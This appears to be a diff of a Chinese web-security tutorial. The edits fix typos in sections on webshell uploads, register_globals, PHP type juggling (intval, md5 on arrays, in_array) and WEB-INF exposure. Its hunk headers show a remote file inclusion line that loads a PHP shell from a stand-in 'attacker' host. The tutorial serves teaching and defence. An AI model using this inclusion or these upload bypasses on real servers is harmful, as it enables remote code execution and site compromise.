@@ -117,7 +117,7 @@ require_once "http://attacker/phpshell.txt?/action/m_share.php";
 
 ## 文件上传
 
-文件上传漏洞是指用户上传了一个可执行脚本文件，并通过此文件获得了执行服器端命令的能力。在大多数情况下，文件上传漏洞一般是指上传 WEB 脚本能够被服务器解析的问题，也就是所谓的 webshell 问题。完成这一攻击需要这样几个条件，一是上传的文件能够这 WEB 容器执行，其次用户能从 WEB 上访问这个文件，最后，如果上传的文件被安全检查、格式化、图片压缩等功能改变了内容，则可能导致攻击失败。
+文件上传漏洞是指用户上传了一个可执行脚本文件，并通过此文件获得了执行服器端命令的能力。在大多数情况下，文件上传漏洞一般是指上传 WEB 脚本能够被服务器解析的问题，也就是所谓的 webshell 问题。完成这一攻击需要这样几个条件，一是上传的文件能够被 WEB 容器执行，其次用户能从 WEB 上访问这个文件，最后，如果上传的文件被安全检查、格式化、图片压缩等功能改变了内容，则可能导致攻击失败。
 
 ### 绕过上传检查
 
@@ -167,7 +167,7 @@ require_once "http://attacker/phpshell.txt?/action/m_share.php";
 
 ### 全局变量覆盖
 
-变量如果未被初始化，且能够用户所控制，那么很可能会导致安全问题。
+变量如果未被初始化，且能够被用户所控制，那么很可能会导致安全问题。
 
 ```ini
 register_globals=ON
@@ -336,7 +336,7 @@ if(isset($_GET['code'])){
 
 异或的二进制的值是 `‭01111110‬` ，对应的 `ASCII` 值是 `126` ，对应的字符串的值就是 `~` 了
 
-我们都知道， `PHP` 是弱类型的语言，也就是说在 `PHP` 中我们可以不预先声明变量的类型，而直接声明一个变量并进行初始化或赋值操作。正是由于 `PHP` 弱类型的这个特点，我们对 `PHP` 的变类型进行隐式的转换，并利用这个特点进行一些非常规的操作。如将整型转换成字符串型，将布尔型当作整型，或者将字符串当作函数来处理，下面我们来看一段代码：
+我们都知道， `PHP` 是弱类型的语言，也就是说在 `PHP` 中我们可以不预先声明变量的类型，而直接声明一个变量并进行初始化或赋值操作。正是由于 `PHP` 弱类型的这个特点，我们对 `PHP` 的变量类型进行隐式的转换，并利用这个特点进行一些非常规的操作。如将整型转换成字符串型，将布尔型当作整型，或者将字符串当作函数来处理，下面我们来看一段代码：
 
 ```
 <?php
@@ -629,7 +629,7 @@ var_dump(intval('3abcd')) //3
 var_dump(intval('abcd')) //0
 ```
 
-说明 `intval()` 转换的时候，会将从字符串的开始进行转换知道遇到一个非数字的字符。即使出现无法转换的字符串， `intval()` 不会报错而是返回 0。
+说明 `intval()` 转换的时候，会从字符串的开始进行转换直到遇到一个非数字的字符。即使出现无法转换的字符串， `intval()` 不会报错而是返回 0。
 
 同时，程序员在编程的时候也不应该使用如下的这段代码：
 
@@ -653,7 +653,7 @@ $array1[] = array(
  "bar" => "foo",
 );
 $array2 = array("foo", "bar", "hello", "world");
-var_dump(md5($array1)==var_dump($array2)); //true
+var_dump(md5($array1)==md5($array2)); //true
 ```
 
 PHP 手册中的 md5（）函数的描述是 `string md5 ( string $str [, bool $raw_output = false ] )`，`md5()` 中的需要是一个 string 类型的参数。但是当你传递一个 array 时，`md5()` 不会报错，只是会无法正确地求出 array 的 md5 值，这样就会导致任意 2 个 array 的 md5 值都会相等。
@@ -690,7 +690,7 @@ case 3:
 
 **in_array()**
 
-在 PHP 手册中， `in_array()` 函数的解释是 `bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )` ,如果strict参数没有提供，那么 `in_array` 就会使用松散比较来判断 `$needle` 是否在 `$haystack` 中。当 strince 的值为 true 时， `in_array()` 会比较 needls 的类型和 haystack 中的类型是否相同。
+在 PHP 手册中， `in_array()` 函数的解释是 `bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )` ,如果strict参数没有提供，那么 `in_array` 就会使用松散比较来判断 `$needle` 是否在 `$haystack` 中。当 strict 的值为 true 时， `in_array()` 会比较 needls 的类型和 haystack 中的类型是否相同。
 
 ```php
 $array=[0,1,2,'3'];
@@ -858,12 +858,12 @@ WEB-INF 是 Java Web 应用的安全目录，web.xml 中有文件的映射关系
 WEB-INF 主要包含一下文件或目录：
 
 - `/WEB-INF/web.xml` ：Web 应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。
-- `/WEB-INF/classes/` ：含了站点所有用的 class 文件，包括 servlet class 和非 servlet class，他们不能包含在。jar 文件中。
+- `/WEB-INF/classes/` ：含了站点所有用的 class 文件，包括 servlet class 和非 servlet class，他们不能包含在 jar 文件中。
 - `/WEB-INF/lib/` ：存放 web 应用需要的各种 JAR 文件，放置仅在这个应用中要求使用的 jar 文件，如数据库驱动 jar 文件。
 - `/WEB-INF/src/` ：源码目录，按照包名结构放置各个 java 文件。
 - `/WEB-INF/database.properties` ：数据库配置文件。
 
-通过找到 web.xml 文件，推断 class 文件的路径，最后直接 class 文件，在通过反编译 class 文件，得到网站源码。 一般情况，jsp 引擎默认都是禁止访问 WEB-INF 目录的，Nginx 配合 Tomcat 做均衡负载或集群等情况时，问题原因其实很简单，Nginx 不会去考虑配置其他类型引擎（Nginx 不是 jsp 引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改 Nginx 配置文件禁止访问 WEB-INF 目录就好了：
+通过找到 web.xml 文件，推断 class 文件的路径，最后直接 class 文件，再通过反编译 class 文件，得到网站源码。 一般情况，jsp 引擎默认都是禁止访问 WEB-INF 目录的，Nginx 配合 Tomcat 做均衡负载或集群等情况时，问题原因其实很简单，Nginx 不会去考虑配置其他类型引擎（Nginx 不是 jsp 引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改 Nginx 配置文件禁止访问 WEB-INF 目录就好了：
 
 ```nginx
 location ~ ^/WEB-INF/* { deny all; } # 或者return 404; 或者其他！
